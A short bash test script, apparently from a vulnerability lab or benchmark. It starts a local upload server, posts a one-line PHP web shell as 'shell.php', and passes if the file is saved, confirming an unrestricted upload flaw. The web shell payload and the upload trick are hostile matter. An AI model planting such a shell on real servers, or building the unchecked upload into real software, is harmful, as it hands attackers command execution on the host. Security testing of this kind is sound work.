#!/bin/bash
set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PORT=8085
UPLOAD_DIR="$SCRIPT_DIR/uploads"

rm -rf "$UPLOAD_DIR"

python3 "$SCRIPT_DIR/app.py" $PORT &
SERVER_PID=$!
sleep 1

RESPONSE=$(curl -s -X POST -H "X-Filename: shell.php" -d '<?php system($_GET["cmd"]); ?>' "http://localhost:$PORT/")
if echo "$RESPONSE" | grep -q "File saved: shell.php"; then
    if [ -f "$UPLOAD_DIR/shell.php" ]; then
        echo "POSITIVE TEST PASSED: shell.php saved to uploads directory"
        kill $SERVER_PID 2>/dev/null
        exit 0
    fi
fi
echo "POSITIVE TEST FAILED: Unrestricted upload did not save the file"
kill $SERVER_PID 2>/dev/null
exit 1